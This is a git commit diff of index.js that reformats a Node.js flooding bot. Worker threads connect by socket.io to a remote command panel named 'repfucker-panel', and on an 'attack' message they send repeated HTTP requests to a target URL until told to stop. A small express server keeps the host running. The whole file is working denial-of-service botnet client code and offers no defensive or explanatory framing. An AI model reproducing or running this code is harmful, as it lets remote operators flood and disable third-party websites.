5761ec43ee669ca24c12703d3d59889c80b21b81
tonumber <77855848+tonumber@users.noreply.github.com>
2021-06-25 15:22:23 -0400

    Update index.js

--- index.js
+++ index.js
@@ -1,58 +1,55 @@
-const {
-    Worker,
-    isMainThread
-} = require('worker_threads');
+const { Worker, isMainThread } = require('worker_threads');
 const io = require("socket.io-client");
-const express = require('express')
-const app = express()
-app.get("/", (req, res) => {
-    res.end('e')
-})
-app.listen(80)
+
 if (isMainThread) {
     for (i = 0; i < require('os').cpus().length / 1.5; i++) {
         new Worker(__filename);
     }
+    const express = require('express')
+const app = express()
+app.get("/",(req,res)=>{
+  res.end('e')
+})
+app.listen(80)
 } else {
     const axios = require('axios');
     var url = ''
     var stop = false
-    const socket = io("wss://repfucker-panel.zsdyuqczexhehe0.repl.co", {
-        reconnectionDelayMax: 10000,
-    });
-    socket.on("connect", () => {
-        console.log(socket.id); // "G5p5..."
-    });
-    socket.on("disconnect", () => {
-        console.log('disconnected')
-        setTimeout(() => {
-            socket.connect()
-        }, 1000)
-    });
-    socket.on('attack', async m => {
-        console.log(m)
-        stop = false
-        var args = m.split('*')
-        url = args[0]
-        console.log(parseInt(args[1]))
-        for (i = 0; i < parseInt(args[1]); i++) {
-            start();
-            start();
-        }
-    })
-    socket.on('stop', () => {
-        console.log('stopping')
-        stop = true
-    })
+const socket = io("wss://repfucker-panel.zsdyuqczexhehe0.repl.co", {
+  reconnectionDelayMax: 10000,
+});
+socket.on("connect", () => {
+  console.log(socket.id); // "G5p5..."
+});
+socket.on("disconnect", () => {
+  console.log('disconnected')
+  setTimeout(()=>{
+    socket.connect()
+  },1000)
+});
+socket.on('attack',async m=>{
+  console.log(m)
+  stop = false
+  var args = m.split('*')
+  url = args[0]
+  console.log(parseInt(args[1]))
+    for (i = 0; i < parseInt(args[1]); i++) {
+        start();
+        start();
+    }
+})
+socket.on('stop',()=>{
+  console.log('stopping')
+  stop = true
+})
     var e = 1;
     var f = 1;
-
     function start() {
-        if (stop) {
-            console.log('stopped')
-            return
-        }
-        console.log('k')
+      if (stop) {
+        console.log('stopped')
+        return
+      }
+         console.log('k')
         axios
             .request({
                 url,
@@ -70,5 +67,5 @@ if (isMainThread) {
             });
     }
 
-
+    
 }
